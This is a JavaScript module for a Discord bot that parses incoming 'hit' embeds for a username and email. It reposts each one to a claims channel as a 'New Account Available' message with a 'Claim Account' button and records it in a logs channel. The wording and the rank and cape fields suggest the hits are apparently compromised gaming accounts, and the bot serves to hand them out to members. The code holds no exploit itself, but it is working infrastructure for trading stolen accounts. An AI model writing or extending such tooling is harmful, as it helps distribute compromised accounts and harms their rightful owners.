const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

module.exports = {
  async processHitsEmbed(message, client) {
    try {
      if (!message.embeds.length) return;

      // Only process the first embed (no duplicates)
      const embed = message.embeds[0];
      const hitDescription = embed.description || '';

      // Extract account info from the embed
      const lines = hitDescription.split('\n');
      let username = 'Unknown';
      let email = 'Unknown';

      lines.forEach(line => {
        if (line.includes('Username') || line.includes('username')) {
          username = line.split(':')[1]?.trim() || username;
        }
        if (line.includes('Email') || line.includes('email')) {
          email = line.split(':')[1]?.trim() || email;
        }
      });

      const accountId = `ACC-${Date.now()}`;

      // Get the claims channel
      const claimsChannel = await client.channels.fetch(process.env.CLAIMS_CHANNEL_ID);
      if (!claimsChannel) {
        console.error('❌ Claims channel not found!');
        return;
      }

      // Create Components v2 Embed
      const claimEmbed = new EmbedBuilder()
        .setColor('#FF6B9D')
        .setTitle('🎮 New Account Available')
        .setDescription(`**Username:** ${username}\n**Email:** ${email}`)
        .addFields(
          { name: '📊 Status', value: '```Unclaimed```', inline: true },
          { name: '⭐ Rank', value: '```Loading...```', inline: true },
          { name: '🎨 Capes', value: '```Unknown```', inline: true }
        )
        .setTimestamp()
        .setFooter({ text: 'Claim this account before it\'s gone!' });

      // Create button row
      const claimButton = new ButtonBuilder()
        .setCustomId(`claim_${accountId}`)
        .setLabel('🚀 Claim Account')
        .setStyle(ButtonStyle.Success);

      const row = new ActionRowBuilder().addComponents(claimButton);

      // Send the embed to CLAIMS_CHANNEL (only 1 message)
      const sentMessage = await claimsChannel.send({
        embeds: [claimEmbed],
        components: [row],
      });

      // Send log to LOGS_CHANNEL
      const logsChannel = await client.channels.fetch(process.env.LOGS_CHANNEL_ID);
      if (logsChannel) {
        const logEmbed = new EmbedBuilder()
          .setColor('#0099FF')
          .setTitle('📝 New Hit Processed')
          .addFields(
            { name: '🎮 Username', value: `\`\`\`${username}\`\`\``, inline: true },
            { name: '📧 Email', value: `\`\`\`${email}\`\`\``, inline: true },
            { name: '📍 Account ID', value: `\`\`\`${accountId}\`\`\``, inline: false },
            { name: '📤 Posted To', value: `\`\`\`#${claimsChannel.name}\`\`\``, inline: true },
            { name: '⏰ Time', value: `\`\`\`${new Date().toLocaleString()}\`\`\``, inline: true }
          )
          .setTimestamp()
          .setFooter({ text: 'Hits Manager' });

        await logsChannel.send({ embeds: [logEmbed] });
      }

      console.log(`✅ Hit processed and sent to claims: ${username}`);
    } catch (error) {
      console.error('❌ Error processing hits embed:', error);
    }
  },
};
